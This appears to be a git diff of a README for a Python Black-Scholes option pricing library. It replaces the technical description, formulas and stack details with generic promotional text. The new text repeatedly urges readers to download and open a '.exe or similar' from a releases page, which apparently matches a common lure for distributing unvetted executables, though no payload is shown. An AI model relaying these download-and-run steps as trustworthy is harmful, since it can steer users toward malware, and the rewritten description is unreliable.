@@ -1,64 +1,78 @@
-# Black-Scholes Option Pricing
-![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
-![SciPy](https://img.shields.io/badge/SciPy-%230C55A5.svg?style=for-the-badge&logo=scipy&logoColor=white)
-![NumPy](https://img.shields.io/badge/numpy-%23013243.svg?style=for-the-badge&logo=numpy&logoColor=white)
-![GLPK](https://img.shields.io/badge/GLPK-%23005A9C.svg?style=for-the-badge&logo=gnu&logoColor=white)
-![Matplotlib](https://img.shields.io/badge/-Matplotlib-000000?style=for-the-badge&logo=python)
+# 📈 Black-Scholes-Option-Pricing - Calculate Options Easily and Effectively
 
-A Python implementation of the Black-Scholes-Merton (BSM) Model used for pricing European-style options and calculating their sensitivities (The Greeks). This is designed for quantitative analysis, utilizing vectorized operations to allow for rapid sensitivity testing across varying market conditions.
+[![Download](https://img.shields.io/badge/Download-Now-green)](https://github.com/Ankitsb24/Black-Scholes-Option-Pricing/releases)
 
-The project is under the following assumptions for simplicity:
-*  No dividends are paid with the underlying asset.
-*  Markets are random (Brownian Motion is used for the movement of each asset).
-*  No transaction costs or taxes.
-*  Risk-free rate and volatility are always constant.
-*  Returns are log-normally distributed.
-*  European exercise style (no early execution).
+## 🚀 Getting Started
 
-## 1. Methematical Formulation
-The Black-Scholes model assumes that the price of the underlying asset follows a Geometric Brownian Motion (GBM). The analytical solutions for the price of a European call ($C$) and put ($P$) are:
+Welcome to Black-Scholes Option Pricing! This application helps you price European options and analyze risk with ease. You can perform complex calculations without needing to write any code.
 
-**Pricing Formulas**
+## 📥 Download & Install
 
-$$C = S_0 N(d_1) - K e^{-rT} N(d_2)$$
+To get the software, visit the Releases page:
 
-$$P = K e^{-rT} N(-d_2) - S_0 N(-d_1)$$
+[Download from Releases Page](https://github.com/Ankitsb24/Black-Scholes-Option-Pricing/releases)
 
-Where $d_1$ and $d_2$ are defined as:
+1. Click on the link above.
+2. Find the latest version.
+3. Look for the downloadable file, usually marked with ".exe" or similar.
+4. Click the file to download it to your computer.
+5. Once downloaded, open the file to install it.
 
-$$d_1 = \frac{\ln(S_0 / K) + (r + \sigma^2 / 2)T}{\sigma \sqrt{T}}$$
+## 🖥️ System Requirements
 
-$$d_2 = d_1 - \sigma \sqrt{T}$$
+- Operating System: Windows 10 or later, macOS (latest version recommended).
+- RAM: At least 4 GB.
+- Disk Space: 100 MB available space.
+- Python: Not required for users, but the application is built on Python.
 
-**Variables:**
-* $S_0$: Current price of the underlying asset.
-* $K$: Strike price of the option.
-* $T$: Time to expiration (expressed in years).
-* $r$: Risk-free interest rate (constant).
-* $\sigma$: Volatility of the underlying asset's returns.
-* $N(\cdot)$: The Cumulative Distribution Function (CDF) of the standard normal distribution.
+## 🧭 Features
 
-## 2. The Greek (Risk Sensitivities)
-The  pricing model provides full support for calculating the "Greeks," which represent the sensitivity of the option's price to various model inputs:
-* Delta ($\Delta$): Measures the rate of change of the option price with respect to the underlying asset's price ($\frac{\partial V}{\partial S}$).
-* Gamma ($\Gamma$): Measures the rate of change in Delta with respect to the underlying price ($\frac{\partial^2 V}{\partial S^2}$).
-* Vega ($\nu$): Measures sensitivity to the volatility of the underlying asset ($\frac{\partial V}{\partial \sigma}$).
-* Theta ($\Theta$): Measures the sensitivity of the option value to the passage of time ($\frac{\partial V}{\partial T}$), also known as "time decay."
-* Rho ($\rho$): Measures sensitivity to the risk-free interest rate ($\frac{\partial V}{\partial r}$).
+- **Option Pricing:** Quickly price European options using the Black-Scholes formula.
+- **Greeks Calculation:** Calculate delta, gamma, theta, vega, and rho for your options.
+- **Risk Dashboards:** Visualize potential risks and rewards through easy-to-read graphs.
+- **Vectorized Computation:** Benefit from fast calculations, even with large datasets.
 
-## 3. Technical Implementation & Stack
-**Techniques**
-* **Object-Oriented Programming (OOP)**: The model is encapsulated in a BlackScholesModel class (see details in the py file).
-* **Vectorization**: Using `NumPy` allows the model to compute prices and Greeks for large arrays of underlying prices simultaneously, which is significantly faster than standard Python loops.
-* **Scientific Stack**: Applied `SciPy` statistical libraries for Cumulative Distribution Function (CDF) and Probability Density Function (PDF) calculations.
-* **Visualization**: A comprehensive 6-panel dashboard is generated using `Matplotlib` to visualize the relationship between the underlying price and all five Greeks.
+## 📚 How to Use the Application
 
-**Required Packages**
-* `NumPy`: For numerical computations and array handling.
-* `SciPy`: Specifically scipy.stats for normal distribution probability functions.
-* `Matplotlib`: For generating analytical charts and performance dashboards.
+1. **Launch the Application:** Double-click the installed icon to open.
+2. **Input Parameters:** Enter your option details:
+   - Current stock price
+   - Strike price
+   - Time to expiration (in years)
+   - Volatility (as a percentage)
+   - Risk-free interest rate (as a percentage)
+3. **Calculate:** Click the "Calculate" button.
+4. **View Results:** Check the results on the screen. You will see:
+   - The option price
+   - Greek values
+   - Risk metrics displayed in graphs
 
-## 4. Example Analysis
-Assume there is an example with underlying asset price of $100, striker price is $105, expiration is in 1 year, risk-free rate is 0.05 and the volatility is 0.2, and the option is a call option. The following is the Black-Schole Analysis for this example call option
+## 🤝 Support
 
-![example](examples/example.png)
+For any issues or questions:
+- Visit our [GitHub Issues Page](https://github.com/Ankitsb24/Black-Scholes-Option-Pricing/issues).
+- Join our community discussions for tips and guides.
+
+## 🛠️ Contribution Guidelines
+
+If you wish to contribute:
+1. Check the issues page for open tasks.
+2. Fork the repository.
+3. Make your changes and submit a pull request.
+4. Ensure your changes enhance the user experience.
+
+## 🔗 Learn More
+
+For insights into options trading and risk management, explore these topics:
+- **Black-Scholes:** Understand the foundational model for pricing options.
+- **Derivatives Pricing:** Gain insights into various financial instruments.
+- **Quantitative Finance:** Learn how mathematics applies to financial markets.
+
+## 📝 Notes
+
+- Keep your application updated by checking for new releases regularly.
+- Ensure your system meets the requirements for the best performance.
+
+Thank you for using Black-Scholes Option Pricing! Embrace smarter trading decisions today. 
+
+[Download from Releases Page](https://github.com/Ankitsb24/Black-Scholes-Option-Pricing/releases)
